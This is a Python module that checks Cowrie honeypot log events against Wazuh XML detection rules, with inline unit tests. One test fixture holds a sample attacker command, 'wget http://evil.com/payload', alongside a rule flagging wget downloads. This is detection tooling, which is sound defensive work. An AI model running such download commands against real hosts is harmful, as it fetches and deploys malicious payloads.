"""
rule_matcher.py
---------------
Given a Cowrie JSON log entry (dict), scan every .xml file in the same
directory for Wazuh rules that match the event and return the rule's
id + description on the first match, or None if nothing matches.

Match logic (mirrors a subset of Wazuh's rule engine):
  - <match>   : case-insensitive substring / simple OR-list match against
                the concatenated event string.
  - <regex>   : compiled Python regex match against the concatenated event
                string.
  - <srcip>   : exact match against the event's "src_ip" field.
  - A rule matches when ALL present matching elements pass.

Usage
-----
    from backend.wazuh_rules.rule_matcher import match_cowrie_event

    result = match_cowrie_event(cowrie_log_dict)
    # -> {"rule_id": "100004", "description": "Multiple invalid..."} or None
"""

from __future__ import annotations

import json
import os
import re
import xml.etree.ElementTree as ET
from pathlib import Path
from typing import Optional


# ─── helpers ──────────────────────────────────────────────────────────────────

def _rule_dir() -> Path:
    """Return the directory that contains this file (and all .xml rule files)."""
    return Path(__file__).parent


def _build_event_string(event: dict) -> str:
    """
    Flatten the relevant text fields of a Cowrie event into a single string
    that rule patterns can be matched against.
    """
    parts = [
        str(event.get("eventid", "")),
        str(event.get("message", "")),
        str(event.get("input", "")),
        str(event.get("username", "")),
        str(event.get("password", "")),
        str(event.get("src_ip", "")),
        str(event.get("sensor", "")),
    ]
    return " ".join(p for p in parts if p).lower()


def _match_element(element: ET.Element, event_str: str, event: dict) -> bool:
    """
    Return True if the Wazuh XML matching element passes for this event.

    Supported tags: <match>, <regex>, <srcip>
    """
    tag = element.tag
    text = (element.text or "").strip()

    if tag == "match":
        # Wazuh <match> supports |-separated alternatives
        alternatives = [a.strip().lower() for a in text.split("|")]
        return any(alt in event_str for alt in alternatives if alt)

    if tag == "regex":
        try:
            return bool(re.search(text, event_str, re.IGNORECASE))
        except re.error:
            return False

    if tag == "srcip":
        return event.get("src_ip", "") == text

    # Unknown / unsupported tag — skip (don't block the rule)
    return True


def _rule_matches(rule: ET.Element, event_str: str, event: dict) -> bool:
    """
    Return True when ALL matching elements inside a <rule> element pass.
    Elements that are purely structural (description, group, if_matched_sid,
    options, same_*) are ignored.
    """
    MATCH_TAGS = {"match", "regex", "srcip"}
    matchers = [child for child in rule if child.tag in MATCH_TAGS]

    if not matchers:
        # A rule with no match conditions would apply to everything — skip it
        # to avoid spurious hits on structural-only rules.
        return False

    return all(_match_element(m, event_str, event) for m in matchers)


# ─── public API ───────────────────────────────────────────────────────────────

def match_cowrie_event(
    event: dict,
    rules_dir: Optional[str | Path] = None,
) -> Optional[dict]:
    """
    Match a Cowrie JSON log event against every Wazuh XML rule file found in
    *rules_dir* (defaults to the directory containing this module).

    Parameters
    ----------
    event : dict
        A single Cowrie log entry (already parsed from JSON).
    rules_dir : str | Path | None
        Directory to scan for *.xml rule files.  Defaults to the folder where
        this module lives.

    Returns
    -------
    dict  with keys ``rule_id`` and ``description`` on the first match, or
    None  if no rule matched.
    """
    search_dir = Path(rules_dir) if rules_dir else _rule_dir()
    event_str = _build_event_string(event)

    xml_files = sorted(search_dir.glob("*.xml"))
    for xml_path in xml_files:
        try:
            tree = ET.parse(xml_path)
        except ET.ParseError:
            continue

        root = tree.getroot()

        # Rules can live directly under root or inside <group> wrappers
        candidates: list[ET.Element] = []
        if root.tag == "rule":
            candidates.append(root)
        else:
            candidates.extend(root.iter("rule"))

        for rule in candidates:
            if _rule_matches(rule, event_str, event):
                rule_id = rule.get("id", "unknown")
                desc_el = rule.find("description")
                description = desc_el.text.strip() if desc_el is not None and desc_el.text else ""
                return {"rule_id": rule_id, "description": description}

    return None


# ─── tests ────────────────────────────────────────────────────────────────────

def _run_tests() -> None:
    """
    Inline unit tests.  Run with:
        python -m backend.wazuh-rules.rule_matcher   (or just: python rule_matcher.py)
    """
    import tempfile, textwrap, pathlib

    print("Running rule_matcher tests …\n")
    passed = failed = 0

    def ok(name: str, cond: bool) -> None:
        nonlocal passed, failed
        status = "PASS" if cond else "FAIL"
        print(f"  [{status}] {name}")
        if cond:
            passed += 1
        else:
            failed += 1

    # ── helper: create a temp dir with a single XML rule file ─────────────
    def make_rules_dir(xml_content: str) -> tempfile.TemporaryDirectory:
        tmp = tempfile.TemporaryDirectory()
        (pathlib.Path(tmp.name) / "test_rule.xml").write_text(
            textwrap.dedent(xml_content)
        )
        return tmp

    # ── Test 1: <match> hit ───────────────────────────────────────────────
    xml1 = """\
        <group name="cowrie,">
          <rule id="200001" level="5">
            <match>cowrie.login.failed</match>
            <description>Cowrie SSH login failed</description>
          </rule>
        </group>"""
    with make_rules_dir(xml1) as d:
        event = {"eventid": "cowrie.login.failed", "src_ip": "10.0.0.1"}
        result = match_cowrie_event(event, rules_dir=d)
        ok("match hit", result is not None and result["rule_id"] == "200001")

    # ── Test 2: <match> miss ──────────────────────────────────────────────
    xml2 = """\
        <group name="cowrie,">
          <rule id="200002" level="5">
            <match>cowrie.command.input</match>
            <description>Command executed</description>
          </rule>
        </group>"""
    with make_rules_dir(xml2) as d:
        event = {"eventid": "cowrie.login.success", "src_ip": "10.0.0.1"}
        result = match_cowrie_event(event, rules_dir=d)
        ok("match miss returns None", result is None)

    # ── Test 3: <regex> hit ───────────────────────────────────────────────
    xml3 = """\
        <group name="cowrie,">
          <rule id="200003" level="7">
            <regex>cowrie\\.session\\.(connect|closed)</regex>
            <description>Session lifecycle event</description>
          </rule>
        </group>"""
    with make_rules_dir(xml3) as d:
        event = {"eventid": "cowrie.session.connect", "src_ip": "192.168.1.5"}
        result = match_cowrie_event(event, rules_dir=d)
        ok("regex hit", result is not None and result["rule_id"] == "200003")

    # ── Test 4: <srcip> match ─────────────────────────────────────────────
    xml4 = """\
        <group name="cowrie,">
          <rule id="200004" level="9">
            <srcip>1.2.3.4</srcip>
            <description>Known bad IP</description>
          </rule>
        </group>"""
    with make_rules_dir(xml4) as d:
        ok("srcip hit",
           match_cowrie_event({"src_ip": "1.2.3.4"}, rules_dir=d) is not None)
        ok("srcip miss",
           match_cowrie_event({"src_ip": "9.9.9.9"}, rules_dir=d) is None)

    # ── Test 5: rule with no match elements skipped ───────────────────────
    xml5 = """\
        <group name="cowrie,">
          <rule id="200005" level="3">
            <description>No match elements – should be skipped</description>
          </rule>
        </group>"""
    with make_rules_dir(xml5) as d:
        result = match_cowrie_event({"eventid": "cowrie.login.failed"}, rules_dir=d)
        ok("no-match-element rule skipped", result is None)

    # ── Test 6: malformed XML is silently skipped ─────────────────────────
    with tempfile.TemporaryDirectory() as d:
        bad = pathlib.Path(d) / "bad.xml"
        bad.write_text("<<< NOT XML >>>")
        result = match_cowrie_event({"eventid": "cowrie.login.failed"}, rules_dir=d)
        ok("malformed XML silently skipped", result is None)

    # ── Test 7: | OR list in <match> ─────────────────────────────────────
    xml7 = """\
        <group name="cowrie,">
          <rule id="200007" level="6">
            <match>login.failed|login.success</match>
            <description>Any login event</description>
          </rule>
        </group>"""
    with make_rules_dir(xml7) as d:
        ok("match OR-list first alt",
           match_cowrie_event({"eventid": "cowrie.login.failed"}, rules_dir=d) is not None)
        ok("match OR-list second alt",
           match_cowrie_event({"eventid": "cowrie.login.success"}, rules_dir=d) is not None)
        ok("match OR-list no alt",
           match_cowrie_event({"eventid": "cowrie.session.connect"}, rules_dir=d) is None)

    # ── Test 8: description returned correctly ────────────────────────────
    xml8 = """\
        <group name="cowrie,">
          <rule id="200008" level="5">
            <match>wget</match>
            <description>Wget download attempt detected</description>
          </rule>
        </group>"""
    with make_rules_dir(xml8) as d:
        r = match_cowrie_event({"input": "wget http://evil.com/payload"}, rules_dir=d)
        ok("description returned",
           r is not None and r["description"] == "Wget download attempt detected")

    # ── summary ───────────────────────────────────────────────────────────
    print(f"\nResults: {passed} passed, {failed} failed")
    if failed:
        raise SystemExit(1)


if __name__ == "__main__":
    _run_tests()
